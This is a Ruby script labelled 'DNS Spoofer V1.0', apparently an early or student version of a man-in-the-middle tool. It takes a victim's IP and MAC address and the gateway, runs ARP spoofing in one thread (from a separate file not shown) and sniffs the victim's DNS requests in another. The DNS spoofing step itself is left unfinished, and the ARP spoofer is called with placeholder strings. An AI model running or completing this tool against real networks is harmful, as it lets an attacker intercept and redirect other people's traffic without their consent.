#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# Sniffer.rb
#-------------------------------------------------------------------------------
require 'rubygems'
require 'packetfu'
require 'thread'

#require 'dns.rb'
require './arp.rb'
require './lib/lib_trollop.rb'

#------
# Trollop Command Line Argument Parsing
#------
opts = Trollop::options do
    version "DNS Spoofer V1.0 (c) 2012 Karl Castillo"
    banner <<-EOS
DNS Spoofer in Ruby.

Usage:
    ruby main.rb [options]
    EOS
    
    opt :host, "Victim IP", :short => "H", :type => :string, :default => "127.0.0.1" # String --host <s>, default 127.0.0.1
    opt :mac, "Victim MAC", :short => "M", :type => :string # String --mac <s>
    opt :gate, "Gateway", :short => "G", :type => :string, :default => "192.168.0.100" # String --gate <s>, default 192.168.0.100
    opt :iface, "Interface", :short => "i", :type => :string, :default => "em1" # String --iface <s>, default em1
    
end # Trollop

#------
# Preparations
#------

# Check if user is running as root
raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

#-----
# Start Capturing
#-----
def sniff(iface = "em1")
    # Sniff only DNS requests
    filter = "udp and dst port 53"
    pcap = Packetfu::Capture.new(:iface => iface, :start => true, 
                                 :filter => filter)

    pcap.stream.each do |pkt|
        packet = Packetfu::Packet.parse pkt
    end # pcap.stream.each do |pkt|
end # sniff

begin
    # Create necessary objects
    arp = ARPSpoof.new("victim IP", "victim mac", "router ip", "wlan0")
    arp_thread = Thread.new { arp.start }
    sniff_thread = Thread.new{ sniff }
    
    # Start both spoofing threads
    arp_thread.join
    sniff_thread.join
    
    # Catch CTRL^C
    rescue Interrupt
    
    # Stop ARP spoofing
    arp.stop
    Thread.kill(arp_thread)
    
    # Stop DNS spoofing
    #dns.stop
    Thread.kill(sniff_thread)
    
    exit 0
end
